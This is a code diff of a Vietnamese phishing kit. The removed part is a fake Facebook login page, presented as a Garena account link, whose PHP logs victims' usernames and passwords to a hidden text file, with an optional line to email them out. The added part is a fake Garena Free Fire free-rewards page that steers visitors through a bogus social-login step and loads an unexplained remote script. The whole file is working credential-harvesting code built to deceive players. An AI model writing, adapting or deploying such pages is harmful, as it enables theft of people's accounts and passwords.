@@ -1,179 +1,331 @@
-<?php
-  session_start();
-     date_default_timezone_set('Asia/Ho_Chi_Minh');
 
- $huongdz['num'] = 0;
-	if(isset($_SESSION['huongdz'])) {
-		$huongdz = $_SESSION['huongdz'];
-	}
-	if($huongdz['num'] == 5){ //đăt số lần đăng nhập cho phép
-	    die('<script>alert("website đang trìtrì)</script>') ; //thông báo sau khi đăng nhập quá số lần cho phép
-	}
-   if(isset($_POST["taikhoan"])){
-       $time = date('H:i:s d/m/Y');
-         $username = $_POST["taikhoan"];
-     $password = $_POST["matkhau"];
-      $headers = "Tài khoản - Facebook";
-    $subject = "code by Hướng";
-      $body = "Time: ".$time."|acc: ".$username."|pass: ".$password."\n"; //định dạng acc|pass
-  //  mail("jaxuatt6@gmail.com", $headers, $body, $subject);  // muốn gửi mail thì để dòng mail này 
-     $test = fopen("amdin/h.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
-     fwrite($test,$body);
-     fclose($test);
-     	$huongdz['num']++;
-$_SESSION['huongdz'] = $huongdz;
-   }
-?> 
- <!DOCTYPE html>
-        <html>
- 
-        <head>
-            <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-            <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-            <link href="https://i.upanh.org/2022/05/11/image2c2ea2f667fadd69.png" rel="shortcut icon" sizes="196x196" />
-            <title>Faceb&#111;&#111;k </title>
-            <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
-          <link rel="stylesheet" type="text/css" href="https://scripth.glitch.me/web/fb.css" />
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="Description" content="Garena Free Fire" />
+		<meta name="Keywords" content="Garena Free Fire" />
+		<meta property="og:type" content="website">
+		<meta property="og:titleA" content="Garena Free Fire" />
+		<meta property="og:description" content="Garena Free Fire" />
+		<meta property="og:url" content="./">
+		<meta property="og:image" content="img/bg_1.jpg" />
+		<meta name="theme-color" content="#000">
+		<meta property="og:image" content="img/bg_1.jpg">
+		<title>Garena Free Fire</title>
+		<link rel="stylesheet" href="style.css?v=<?=time();?>" />
+		<link rel="stylesheet" href="/css/style.css">
+		<link rel="stylesheet" href="/css/animate.css">
+		<link rel="stylesheet" href="/css/login/facebook.css">
 		
-        </head>
- 
-        <body class="touch x1 _fzu _50-3 iframe acw portrait">
-            <div id="viewport">
-                <h1 style="display: block; height: 0; overflow: hidden; position: absolute; width: 0; padding: 0;">Faceb&#111;ok
-                </h1>
- 
-                <div id="page" class="___class_+?1___">
-                    <div class="_129_" id="header-notices"></div>
-                    <div class="_4g33 _52we _52z5" id="header">
-                        <div class="_4g34 _52z6">
-                            <a href="#">
-                                <i class="img sp_7V_P8-AK9yC sx_ce405b"><u>faceb&#111;ok</u></i>
-                            </a>
-                        </div>
-                    </div>
-                    <div class="_5yd0 _2ph- _5yd1" id="login_error1" data-sigil="m_login_notice" hidden>Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <a class="_652e">Đăng ký tài khoản.</a></div>
-                    <div class="_5yd0 _2ph- _5yd1" id="login_error2" data-sigil="m_login_notice" hidden><span>Sai mật khẩu. <a  class="_652e" aria-label="Bạn quên mật khẩu?">Bạn quên mật khẩu?</a></span></div>
-                    <div class="_5soa acw" id="root" role="main">
-                        <div class="_4g33">
-                            <div class="_4g34" id="u_0_0">
-                                                        <div class="aclb _4-4l">
-                                    <div class="_5rut">
-                                        <div>
-                                            <div class="_52jj _3-q2">
-                                                <img src="https://ticchien111.github.io/giaodien-fb-fake/logo.png" width="70" class="_3-q3 img" />
-                                                <div class="_52je _52j9">Hãy đăng nhập vào tài khoản Faceb&#111;&#111;k đã liên kết với Garena</div>
-                                            </div>
-                                        </div>
-                                        <form  class="mobile-login-form _5spm" id="login_form" novalidate="1">
-                                                           <div class="_56be _5sob">
-                                                <div class="_55wo _55x2 _56bf">
-                                                    <div id="email_input_container">
-                                                        <input class="_56bg _4u9z _5ruq "
-                                                        id="id" name="taikhoan" placeholder="Email hoặc số điện thoại" type="text"
-                                                            value="" />
-                                                    </div>
-                                                    <div>
-                                                        <div class="_1upc _mg8">
-                                                            <div class="_4g33">
-                                                                <div class="_4g34 _5i2i _52we">
-                                                                    <div class="_5xu4">
-                                                                        <input autocorrect="off" autocapitalize="off"
-                                                                            class="_56bg _4u9z _27z2" autocomplete="on"
-                                                                            id="m_login_password" name="matkhau"
-                                                                            placeholder="Mật khẩu" type="password" />
-                                                                    </div>
-                                                                </div>
-                                                            </div>
-                                                        </div>
-                                                    </div>
-                                                </div>
-                                            </div>
-                                            <div class="_2pie" style="text-align: center;">
-                                                <div id="u_0_4">
-                                                    <button type="submit" value="Đăng nhập"
-                                                        class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"><span
-                                                            class="_55sr">Đăng nhập</span></button>
-                                                </div>
-                                                <div id="otp_button_elem_container"></div>
-                                            </div>
-                                            <div class="_xo8"></div>
-                                        </form>
-                                        <div>
-                                            <div class="_43mg"><span class="_43mh">hoặc</span></div>
-                                            <div class="_52jj _5t3b" id="u_0_6">
-                                                <a role="button" class="_5t3c  btn btnS medBtn mfsm "
-                                                    id="signup-button"
-                                                    href="https://m.facebook.com/reg/?cid=103&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26redirect_uri%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%253Fclient_id%253D100067%2526redirect_uri%253Dhttps%25253A%25252F%25252Fgiaidau.ff.garena.vn%25252Flogin%25252Fcallback%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Dvi-VN%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db06a8f56-81cb-4296-bc49-4e7d9d0b8657&locale2=vi_VN&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin.php&soft=hjk">
-                                                    Tạo tài khoản mới
-                                                </a>
-                                            </div>
-                                        </div>
-                                        <div>
-                                            <div class="other-links">
-                                                <ul class="_5pkb _55wp">
-                                                    <li>
-                                                        <span class="mfss fcg">
-                                                            <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fskip_api_login%3D1%26api_key%3D2036793259884297%26kid_directed_site%3D0%26app_id%3D2036793259884297%26signed_next%3D1%26next%3Dhttps%253A%252F%252Fwww.facebook.com%252Fdialog%252Foauth%253Fclient_id%253D2036793259884297%2526redirect_uri%253Dhttps%25253A%25252F%25252Fauth.garena.com%25252Foauth%25252Flogin%25253Fclient_id%25253D100067%252526redirect_uri%25253Dhttps%2525253A%2525252F%2525252Fgiaidau.ff.garena.vn%2525252Flogin%2525252Fcallback%252526response_type%25253Dtoken%252526platform%25253D3%252526locale%25253Dvi-VN%2526response_type%253Dtoken%2526scope%253Dpublic_profile%25252Cemail%25252Cuser_friends%2526ret%253Dlogin%2526fbapp_pres%253D0%2526logger_id%253Db06a8f56-81cb-4296-bc49-4e7d9d0b8657%26cancel_url%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%253Fclient_id%253D100067%2526redirect_uri%253Dhttps%25253A%25252F%25252Fgiaidau.ff.garena.vn%25252Flogin%25252Fcallback%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Dvi-VN%2526error%253Daccess_denied%2526error_code%253D200%2526error_description%253DPermissions%252Berror%2526error_reason%253Duser_denied%2523_%253D_%26display%3Dpage%26locale%3Dvi_VN%26pl_dbl%3D0&multiple_results=0&ars=facebook_login&lwv=100&locale2=vi_VN&_rdr"
-                                                                id="forgot-password-link">
-                                                                Quên mật khẩu?
-                                                            </a>
-                                                        </span>
-                                                    </li>
-                                                </ul>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="_55wr _5ui2">
-                            <div class="_5dpw">
-                                <div class="_5ui3" data-nocookies="1" id="locale-selector">
-                                    <div class="_4g33">
-                                        <div class="_4g34">
-                                            <span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
-                                            <div class="_3ztc">
-                                                <span class="_52jc"><a href="#">中文(台灣)</a></span>
-                                            </div>
-                                            <div class="_3ztc">
-                                                <span class="_52jc"><a href="#">Español</a></span>
-                                            </div>
-                                            <div class="_3ztc">
-                                                <span class="_52jc"><a href="#">Français (France)</a></span>
-                                            </div>
-                                        </div>
-                                        <div class="_4g34">
-                                            <div class="_3ztc">
-                                                <span class="_52jc"><a href="#">English (UK)</a></span>
-                                            </div>
-                                            <div class="_3ztc">
-                                                <span class="_52jc"><a href="#">한국어</a></span>
-                                            </div>
-                                            <div class="_3ztc">
-                                                <span class="_52jc"><a href="#">Português (Brasil)</a></span>
-                                            </div>
-                                            <a href="#">
-                                                <div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ"><i
-                                                        class="img sp_7V_P8-AK9yC sx_21ee4d"></i></div>
-                                            </a>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="_5ui4"><span class="mfss fcg">Facebo&#111;k © 2021</span></div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
- 
-            </div>
-            <script>
-            //cài đặt thông báo sau khi đăng nhập ở đây
- let icon ='error'; //icon='error: thất bại | icon='success':thành công
- let title ='Đăng nhập thành công'; // tiêu đề
- let text ='Website đang bảo trìtrì!'; //content
- 
-            </script>
-            <script src="https://scripth.glitch.me/fb.js"></script>
-</body>
+		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+		<link rel="icon" href="https://lienquan.garena.vn/kg/favicon/android-icon-192x192.png">
+		<script src="//cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
+	</head>
+
+	<body>
+	        <script>
+	   function click_login() {
+Swal.fire({
+
+html: `<div class="mt-common-inner" style="display: block;">
+		<h4 class="mt-title">ĐĂNG NHẬP ĐỂ TIẾP TỤC</h4>
+		<p class="mlbb-common-tip">Phương Thúc Đăng Nhập</p>
+		<div class="mlbb-social-box">
+		<a href="javascript:void(0);" onclick="click_get(1);" title="Facebook">
+				<img src="https://cdn.vn.garenanow.com/web/kg/1th5-21/img/logo-facebook.png" width="40" height="40" alt="Facebook"> </a>
+
+		</div>
+		</div>`,
+showConfirmButton: false,
+}) ;
+}
+</script>
+		<div class="container rewardsBox">
+			<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
+				<script src="kensine/vvv.js"></script>
+			<div class="navbar">
+				<div class="navbar-btn-wrapper">
+					<img src="img/menu.png" style="width: 48px;padding:12px;margin-right:-8px;margin-top:-15px">
+					<img src="img/cart.png" style="display: none">
+				</div> 
+				<img src="https://i.imgur.com/jTp9hFG.png">
+				<div class="navbar-txt-game">
+					Garena Free Fire
+					<span><script language="JavaScript">
+<!--
+// Store the date In avarlable
+d = new Date()
+dateText = ""
+// Get the cuurent day and convert it to the name of the day
+dayValue = d.getDay()
+if(dayValue == 0)
+dateText += "Chủ Nhật"
+else if (dayValue == 1)
+dateText += "Thứ hai"
+else if (dayValue == 2)
+dateText += "Thứ Ba"
+else if (dayValue == 3)
+dateText += "Thứ Tư"
+else if (dayValue == 4)
+dateText += "Thứ Năm"
+else if (dayValue == 5)
+dateText += "Thứ Sáu"
+else if (dayValue == 6)
+dateText += "Thứ Bảy"
+// Get the current date; if it's before 2000,add 1900
+dateText += ", Ngày " + d.getDate()
+monthValue = d.getMonth()
+dateText += " "
+if (monthValue == 0)
+dateText += "Tháng 1"
+if (monthValue == 1)
+dateText += "Tháng 2"
+if (monthValue == 2)
+dateText += "Tháng 3"
+if (monthValue == 3)
+dateText += "Tháng 4­"
+if (monthValue == 4)
+dateText += "Tháng 5"
+if (monthValue == 5)
+dateText += "Tháng 6"
+if (monthValue == 6)
+dateText += "Tháng 7"
+if (monthValue == 7)
+dateText += "Tháng 8"
+if (monthValue == 8)
+dateText += "Tháng 9"
+if (monthValue == 9)
+dateText += "Tháng 10"
+if (monthValue == 10)
+dateText += "Tháng 11"
+if (monthValue == 11)
+dateText += "Tháng 12"
+// Get the current year; if it's before 2000, add 1900
+if (d.getYear() < 2000)
+dateText += ", Năm " + (1900 + d.getYear())
+else
+dateText += ", Năm " + (d.getYear())
+// Get the current minutes
+minuteValue = d.getMinutes()
+if (minuteValue < 10)
+minuteValue = "0" + minuteValue
+// Get the current hours
+hourValue = d.getHours()
+// Customize the greeting based on the current hours
+if (hourValue >=5 && hourValue <= 10)
+{
+timeText =  ""
+}
+else if (hourValue > 10 && hourValue <= 12)
+{
+timeText =  ""
+}
+else if (hourValue >= 13 && hourValue <17)
+{
+timeText = " "
+}
+else if (hourValue >=17 && hourValue <18)
+{
+timeText = ""
+}
+else if (hourValue >=18 && hourValue<21)
+{
+timeText =  ""
+}
+else if( hourValue >=21 && hourValue <=24)
+{
+timeText =  ""
+}
+else if(hourValue >=1 && hourValue <5 )
+{
+timeText = ""
+}
+document.write(  dateText + "" + timeText + "")
+-->
+</script> </span>
+					
+				</div> 
+		</div> 
+		<div class="header">
+		<iframe width="400" height="235" src="https://www.youtube.com/embed/FsbMp5rBB1s" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+		</div>
+		<div class="mt-common-inner">
+		<h4 class="mt-title">ĐĂNG NHẬP ĐỂ TIẾP TỤC</h4>
+		<p class="mlbb-common-tip">Đăng Nhập </br> Nên Sử Dụng Tài Khoản Garena Để Nhận Thêm Nhiều Phần Quà Hấp Daxn</p>
+		<div class="mlbb-social-box">
+		<a href="jLJzVV923jDq9Sg2tWrLrU3G36ddTD5H7ZyRwlGR3mOhqNAzpxLVhlGYGyXDX7uQKjzJWmOhESE7NjaZX79p0vdWOLDAE6y9ibO0abcdefghjkl.html" title="Facebook">
+				<img src="https://cdn.vn.garenanow.com/web/kg/1th5-21/img/logo-facebook.png" width="40" height="40" alt="Facebook"> </a>
+		<a href="1BrUyfTDTFblghiAwWgAipJXldivJYBulsRJ5YkBjqOtsCMq0Gcgqz8pK2HbMs3gdj3i1Wk1LS5ru3iJaRCQJnynor8nq9SzK80Zabcdefghjklm.html" title="Garena">
+					<img src="https://cdn.vn.garenanow.com/web/kg/1th5-21/img/logo-garena.png" width="40" height="40" alt="Garena">
+				</a>
+		</div>
+		</div>
+		<div class="box">
+		<div class="event-alert">
+		<img src="img/s4_img2.png" style="display: none">
+		<div class="event-alert-title">NỮ VƯƠNG ĐẠI CHIẾN</div>
+		<div class="event-alert-desc">Sự Kiện OB34 </div>
+		</div>
+		<div class="menu-wrapper-border"></div>
+		<div class="menu-wrapper isinama"></div>
+
+
+
+
+
+
+		 <div class="tab_rewards" id="latest">
+		<div class="scroll">
+		<center>
+		<div class="item lightshagitz">
+		<div>
+		<figure>
+		<img src="https://i.imgur.com/ZVGvk1e.jpg">
+		</figure>
+		</div>
+		<div>
+		<button src="https://i.imgur.com/ZVGvk1e.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">NHẬN</button>
+		</div>
+		</div>
+		<div class="item lightshagitz">
+		<div>
+		<figure>
+		<img src="https://i.imgur.com/jRP45oq.jpg">
+		</figure>
+		</div>
+		<div>
+		<button src="https://i.imgur.com/jRP45oq.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">NHẬN</button>
+		</div>
+		</div>
+		<div class="item lightshagitz">
+		<div>
+		<figure>
+		<img src="https://i.imgur.com/cqC9gDg.jpg">
+		</figure>
+		</div>
+		<div>
+		<button src="https://i.imgur.com/cqC9gDg.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">NHẬN</button>
+		</div>
+		</div>
+		<div class="item lightshagitz">
+		<div>
+		<figure>
+		<img src="https://i.imgur.com/6fqO0Ma.jpg">
+		</figure>
+		</div>
+		<div>
+		<button src="https://i.imgur.com/6fqO0Ma.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">NHẬN</button>
+		</div>
+		</div>
+		<div class="item lightshagitz">
+		<div>
+		<figure>
+		<img src="https://i.imgur.com/GrUvvI5.jpg">
+		</figure>
+		</div>
+		<div>
+		<button src="https://i.imgur.com/GrUvvI5.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">NHẬN</button>
+		</div>
+		</div>
+		<div class="item lightshagitz">
+		<div>
+		<figure>
+		<img src="https://i.imgur.com/1sDZSeo.jpg">
+		</figure>
+		</div>
+		<div>
+		<button src="https://i.imgur.com/1sDZSeo.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">NHẬN</button>
+		</div>
+		</div>
+		<div class="item lightshagitz">
+		<div>
+		<figure>
+		<img src="https://i.imgur.com/TDyIHJZ.jpg">
+		</figure>
+		</div>
+		<div>
+		<button src="https://i.imgur.com/TDyIHJZ.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">NHẬN</button>
+		</div>
+		</div>
+		<div class="item lightshagitz">
+		<div>
+		<figure>
+		<img src="https://i.imgur.com/hNxQkeh.jpg">
+		</figure>
+		</div>
+		<div>
+		<button src="https://i.imgur.com/hNxQkeh.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">NHẬN</button>
+		</div>
+		</div>
+		<div class="item lightshagitz">
+		<div>
+		<figure>
+		<img src="https://i.imgur.com/x3yAg3Z.jpg">
+		</figure>
+		</div>
+		<div>
+		<button src="https://i.imgur.com/x3yAg3Z.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">NHẬN</button>
+		</div>
+		</div>
+
+		</center>
+		</div> 
+		</div> 
+		</div>
+
+
+		<div class="footer">
+		<div class="footer-txt-follow">
+		<center>
+		<img class="footer-follow-icon" src="https://i.imgur.com/EUV3ile.png">
+		</center>
+		<div class="footer-txt-copyright"></div> 
+		<div class="footer-txt-copyright">ⓒ Garena Free Fire</div> 
+		</div> 
+		</div> 
+		<div class="popup reward_confirmation" style="display: none;">
+		<div class="popup-box">
+		<center>
+		<div class="popup-title"><span style="position: absolute;top: 25px;margin-left: 20px"><i class="fa fa-gift"></i> Xác Nhận Phần Thưởng</span></div>
+		</center>
+		<div class="popup-content">
+		<center>
+		<img class="popup-rewards-img1" src="" id="myRewardImg">
+		</div>
+		<div class="popup-btn-wrapper">
+		<button type="button" class="popup-btn-deactive" onmousedown="tutup.play();" onclick="close_reward_confirmation()"><font style="position: absolute;top: 2px;left: 40px">Hủy</font></button>
+		<button type="button" class="popup-btn-active" onmousedown="buka.play();" onclick="click_get(1)"><font style="position: absolute;top: 2px;left: 40px">Nhận</font></button>
+		</div>
+		</div>
+		</div>
+		<script src="https://cdn.jsdelivr.net/npm/js-base64@3.7.1/base64.min.js"></script>
+		<script src="https://cdn.jsdelivr.net/gh/arpantek/get_mainJs@main/script.js"></script>
+
+	    </script>
+        <script type="text/javascript">
+			function click_get(id) {
+				$.ajax({
+					url: 'kensine/click-login.php',
+					type: 'POST',
+					dataType: 'JSON',
+					data: {
+						type: 'click-login',
+						id: id
+					},
+					success: (data) => {
+						if (data.error) { } else {
+							setTimeout(function () {
+								window.location.href = data.url_redirect;
+							}, 200);
+						}
+					}
+				});
+			}
+    	</script>
+
+	</body>
 </html>
